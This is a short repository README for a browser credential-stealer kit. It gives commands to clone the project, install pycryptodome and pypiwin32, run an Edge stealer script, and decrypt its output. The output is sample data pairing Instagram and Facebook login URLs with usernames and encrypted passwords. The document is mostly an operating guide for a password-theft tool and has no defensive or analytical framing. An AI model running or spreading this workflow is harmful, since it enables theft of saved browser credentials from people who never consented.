# Browsers-Stealers-Kit
Collection of browser stealers divided into two parts.

## POC

1. Clone the repository:

```bash
git clone https://github.com/Py-Us3r/Browsers-Stealers-Kit.git
cd Browsers-Stealers-Kit
```

2. Install dependencies:

```bash
pip install pycryptodome pypiwin32
```

3. Run the stealer script:

```bash
python edge_stealer.py
```

4. Copy output and run AES_decrypt:

```bash
python AES_decrypt.py "1|https://www.instagram.com/|testing|763130bdf32f7f15f0e0d465d1d9efddfea8cfe8c9888528fc747d2465e229b1332a015a5e0e|2|https://es-es.facebook.com/login/|test|763130aa62f05764735ecd6085e36c67150040d12d683a74c7c1e8e2bd6c6ab180c812||01fdfe3de68aa38ae2a417d0853264dae9daf48eae6be2cd72eb6b105eb77ac7"
```

